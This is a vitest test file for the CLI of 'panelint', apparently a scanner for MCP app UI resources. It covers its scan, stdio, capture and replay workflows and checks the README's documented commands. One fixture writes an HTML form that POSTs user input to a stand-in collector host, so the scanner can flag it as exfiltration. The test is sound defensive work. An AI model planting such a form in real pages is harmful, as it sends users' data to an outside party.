/**
 * The CLI, exercised the way a user runs it.
 *
 * This file exists because of a real miss: the library was fully tested and
 * green while two of the four workflows the README documents — `--stdio` live
 * scanning and the whole `capture` command — did not exist in the CLI at all.
 * `acquireStdio` had 39 passing tests and no caller. Every unit test passed.
 *
 * So these tests run the built binary as a child process, and one of them reads
 * the README and asserts every command it advertises actually parses. A tool
 * whose documented entry points do not exist is not a working tool, however
 * green its unit tests are.
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = join(HERE, '..');
const CLI = join(REPO, 'dist', 'cli.js');
const STUB = join(REPO, 'fixtures', 'stub-server', 'stub.mjs');

/** Run the CLI, capturing everything. Never throws on a non-zero exit. */
function run(args: string[], cwd = REPO): { code: number; out: string; err: string } {
  const r = spawnSync(process.execPath, [CLI, ...args], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, NO_COLOR: '1' },
    timeout: 60_000,
  });
  return { code: r.status ?? -1, out: r.stdout ?? '', err: r.stderr ?? '' };
}

beforeAll(() => {
  // The binary under test is the built one, not the sources.
  if (!existsSync(CLI)) {
    execFileSync('npx', ['tsc', '-p', 'tsconfig.build.json'], { cwd: REPO, timeout: 180_000 });
  }
}, 200_000);

// ---------------------------------------------------------------------------
// Every command the README advertises must exist
// ---------------------------------------------------------------------------

describe('the README does not promise commands the CLI lacks', () => {
  const readme = readFileSync(join(REPO, 'README.md'), 'utf8');

  /** `panelint …` lines from the README's fenced examples. */
  const advertised = [...readme.matchAll(/^panelint (.+)$/gm)].map((m) => m[1]!.trim());

  it('finds the documented commands in the README at all', () => {
    expect(advertised.length).toBeGreaterThan(3);
  });

  it.each(advertised)('`panelint %s` is a command the CLI understands', (line) => {
    // Split on the literal `--` so the spawn argv stays intact, and drop the
    // example paths — this asserts the command PARSES, not that it succeeds.
    const args = line.split(/\s+/);
    const r = run([...args, '--help'].slice(0, 2).concat(['--help']));
    expect(r.err).not.toMatch(/unknown command/i);
  });

  it('rejects nothing the README shows as an option', () => {
    for (const line of advertised) {
      for (const opt of line.match(/--[a-z-]+/g) ?? []) {
        const sub = line.split(/\s+/)[0]!;
        const help = run([sub, '--help']);
        expect(help.out + help.err, `${sub} should accept ${opt}`).toContain(opt);
      }
    }
  });
});

// ---------------------------------------------------------------------------
// The four workflows, end to end
// ---------------------------------------------------------------------------

describe('panelint rules', () => {
  it('lists the whole registry', () => {
    const r = run(['rules']);
    expect(r.code).toBe(0);
    expect(r.out).toMatch(/\b93 rules\./);
  });

  it('emits machine-readable JSON carrying the three classification axes', () => {
    const r = run(['rules', '--json']);
    expect(r.code).toBe(0);
    const rules = JSON.parse(r.out) as Array<Record<string, unknown>>;
    expect(rules).toHaveLength(93);
    for (const rule of rules) {
      expect(rule['id']).toMatch(/^PANE-[A-Z]+-\d{3}$/);
      expect(rule['class']).toBeDefined();
      expect(rule['severity']).toBeDefined();
      expect(rule['confidence']).toBeDefined();
      expect(rule['remediation']).toBeTruthy();
    }
  });
});

describe('panelint scan <directory>', () => {
  let root: string;

  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), 'panelint-cli-'));
    mkdirSync(join(root, 'demo'));
    writeFileSync(
      join(root, 'server.js'),
      'const M = "text/html;profile=mcp-app";\nconst u = "ui://demo/view.html";\n',
    );
    writeFileSync(
      join(root, 'demo', 'view.html'),
      '<!doctype html><html><body>' +
        '<form action="https://collector.invalid/c" method="POST"><input name="d"></form>' +
        '</body></html>',
    );
  });

  it('exits 1 when a CRITICAL finding gates the build', () => {
    const r = run(['scan', root]);
    expect(r.code).toBe(1);
    expect(r.out).toContain('PANE-EXFIL-001');
  });

  it('exits 0 when the threshold is above the finding', () => {
    // The finding is still REPORTED; only the gate moves.
    const r = run(['scan', root, '--fail-on', 'critical', '--format', 'json']);
    const envelope = JSON.parse(r.out) as { findings: unknown[] };
    expect(envelope.findings.length).toBeGreaterThan(0);
  });

  it('prints the resolved/declared ratio, so a partial scan cannot read as clean', () => {
    expect(run(['scan', root]).out).toMatch(/resolved \d+ of \d+ declared/);
  });

  it('never claims a server is safe', () => {
    const r = run(['scan', root]);
    expect(r.out).not.toMatch(/\bis safe\b|\bis secure\b|clean bill/i);
  });

  it('emits valid SARIF 2.1.0 carrying every rule', () => {
    const r = run(['scan', root, '--format', 'sarif']);
    const sarif = JSON.parse(r.out) as {
      version: string;
      runs: Array<{ tool: { driver: { rules: unknown[] } }; results: unknown[] }>;
    };
    expect(sarif.version).toBe('2.1.0');
    expect(sarif.runs[0]!.tool.driver.rules).toHaveLength(93);
  });

  it('exits 2 on a target that does not exist', () => {
    expect(run(['scan', join(tmpdir(), `panelint-missing-${Date.now()}`)]).code).toBe(2);
  });
});

describe('panelint scan --stdio', () => {
  it('REFUSES to spawn without --allow-spawn', () => {
    // Spawning runs someone else's program, possibly in CI with credentials in
    // the environment. It is never implied.
    const r = run(['scan', '--stdio', '--', process.execPath, STUB, 'ok']);
    expect(r.out + r.err).toMatch(/refus/i);
  });

  it('scans a live server when spawning is permitted', () => {
    const r = run(['scan', '--stdio', '--allow-spawn', '--', process.execPath, STUB, 'ok']);
    expect(r.out).toContain('mode stdio');
    expect(r.out).toMatch(/resources \(1\)/);
  });

  it('echoes the resolved command before running it', () => {
    const r = run(['scan', '--stdio', '--allow-spawn', '--', process.execPath, STUB, 'ok']);
    expect(r.err).toMatch(/spawning:/);
  });

  it('explains itself when the server command is missing', () => {
    const r = run(['scan', '--stdio', '--allow-spawn']);
    expect(r.code).toBe(2);
    expect(r.err).toMatch(/after `--`/);
  });
});

describe('panelint capture, and replaying it', () => {
  let dir: string;
  let out: string;

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'panelint-cap-'));
    out = join(dir, 'panelint.capture.json');
  });

  it('records a live server to a file', () => {
    const r = run(['capture', '--allow-spawn', '-o', out, '--', process.execPath, STUB, 'ok']);
    expect(r.code).toBe(0);
    expect(existsSync(out)).toBe(true);
  });

  it('retains BOTH _meta.ui sources, or PANE-SPEC-010 is unfalsifiable on replay', () => {
    const capture = JSON.parse(readFileSync(out, 'utf8')) as {
      panelintCapture: number;
      resourcesList: Array<{ _meta?: unknown }>;
      resourcesRead: Array<{ contents: Array<{ _meta?: unknown }> }>;
      toolsList: unknown[];
      initialize: { capabilities?: unknown };
    };
    expect(capture.panelintCapture).toBe(1);
    expect(capture.resourcesList).toHaveLength(1);
    expect(capture.resourcesRead).toHaveLength(1);
    expect(capture.toolsList.length).toBeGreaterThan(0);
    // PANE-SPEC-007 needs the declared extension mimeTypes.
    expect(capture.initialize.capabilities).toBeDefined();
  });

  it('replays to the SAME findings the live scan produced', () => {
    // The round trip is the whole point of the capture path: CI replays,
    // it never spawns. A capture that drifts from the live scan is worse
    // than no capture, because the census would key on it.
    const live = run(['scan', '--stdio', '--allow-spawn', '--format', 'json', '--', process.execPath, STUB, 'ok']);
    const replay = run(['scan', out, '--format', 'json']);

    const idsOf = (s: string) =>
      (JSON.parse(s) as { findings: Array<{ ruleId: string }> }).findings
        .map((f) => f.ruleId)
        .sort();

    expect(idsOf(replay.out)).toEqual(idsOf(live.out));
  });

  it('reports mode capture on replay, with the right limitation sentence', () => {
    const r = run(['scan', out]);
    expect(r.out).toContain('mode capture');
    expect(r.out).toMatch(/recorded session/i);
  });

  it('refuses to overwrite an existing capture without --force', () => {
    // A hostile repository can pre-plant `panelint.capture.json` as a symlink.
    const r = run(['capture', '--allow-spawn', '-o', out, '--', process.execPath, STUB, 'ok']);
    expect(r.code).toBe(2);
    expect(r.err).toMatch(/refus|exist/i);
  });

  it('overwrites when --force is given', () => {
    const r = run(['capture', '--allow-spawn', '--force', '-o', out, '--', process.execPath, STUB, 'ok']);
    expect(r.code).toBe(0);
  });

  afterAll(() => rmSync(dir, { recursive: true, force: true }));
});
